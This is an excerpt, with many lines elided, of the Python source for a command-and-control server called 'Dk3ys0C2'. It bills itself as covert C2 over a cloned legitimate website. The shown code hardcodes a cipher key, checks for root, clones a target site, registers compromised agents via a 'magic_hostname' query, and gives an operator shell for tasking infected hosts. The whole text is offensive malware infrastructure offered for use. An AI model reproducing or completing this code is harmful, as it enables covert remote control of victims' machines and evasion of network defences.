...
CIPHER = ("Dk3ys0c2S3curity007#Y3llowH@kC0mp@ny")#("Tr3v0rC2R0x@nd1s@w350m3#TrevorForget")
...
try: import bleach
    ...
    print("[!] Python module bleach not installed. Try pip install bleach and re-run Dk3ys0C2 Server.")
    sys.exit()
import shutil
import logging
import urllib3
...
try:
    ...
    print("[!] Python module tornado not installed. Try pip install tornado and re-run Dk3ys0C2 Server.")
    sys.exit()
import hashlib
import cmd
...
__author__ = 'Dk3ys0 (@Dk3ys0)'
__version__ = 3.0

# ROOT CHECK
if os.geteuid() != 0:
    print("\n[!] Dk3ys0C2 needs to be run as root (web socket binding, etc.)... Re-run Dk3ys0C2 as sudo/root in order to run.")
    sys.exit()
...
class Dk3ys0c2Prompt(cmd.Cmd): #prompt class
    def __init__(self):
        super().__init__()
    intro = "Dk3ys0 C2 shell"
    prompt = 'dk3ys0c2>'
    completekey = 'tab'

    def do_exit(self, inp):
        print("[*] Exiting Dk3ys0C2")
        return True
    
    def help_exit(self):
        print("Exits Dk3ys0C2")

    def do_interact(self, inp):
        try:
            agent = agent_list.get_agent(int(inp))
            print("\n*** interact with {} {}.".format(agent.hostname,agent.sessionid))
            print("[*] Dropping into dk3ys0c2 shell...")
            print("[*] Use exit or back to select other shells")
            while 1:
                task = input(agent.hostname + ":dk3ys0c2>")
                origtask = task
...
class SPQ(tornado.web.RequestHandler):
    ...
    def get(self):
        ...
        if "magic_hostname=" in query_output:
            ...
            print("\n*** Received connection from {} and hostname {} with communication sid {} for Dk3ys0C2.".format(remote_ip, hostname,sid))
        else:
...
*.   .    -=.:#+=#+*==--------+-+*=*= ==         *
 -----=-    *#==*=*+++========++=*+=*O.   :=-=--- 
     ...
     .-=:    *   -=            -=   *    :==:     
        +.  -+     ---:....:---.    +-  .+        
         :--.          ....          .--:         
                ...
                # Coded By Dk3ys0 - @yellowhak
    """)
    
    print("Dk3ys0C2 - Legitimate Website Covert Channel")
    clone_site(USER_AGENT, URL)
    PYTHONVER = sys.version_info[0]
    print('[*] Starting Dk3ys0 C2 Server...')
    ...
    try:
        ...
        commandline = Dk3ys0c2Prompt()
        commandline.cmdloop()
        os._exit(0)

    except KeyboardInterrupt:
        if os.path.isdir("clone_site/"): shutil.rmtree("clone_site/")
        print("\n\n[*] Exiting Dk3ys0C2, covert C2 over legitimate HTTP(s).")
        os._exit(0)
